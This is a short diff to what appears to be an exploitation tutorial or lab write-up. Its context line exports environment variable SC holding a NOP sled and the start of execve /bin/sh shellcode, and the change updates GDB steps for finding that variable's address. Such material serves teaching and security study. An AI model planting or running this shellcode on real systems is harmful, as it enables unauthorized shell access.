@@ -178,7 +178,9 @@ export SC=$(perl -e 'print "\x90" x 1000 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73
 In GDB, the variable is around:
 
 ```gdb
-p/x getenv("SC")
+break main
+run
+p/x (char *)getenv("SC")
 ```
 
 Result:
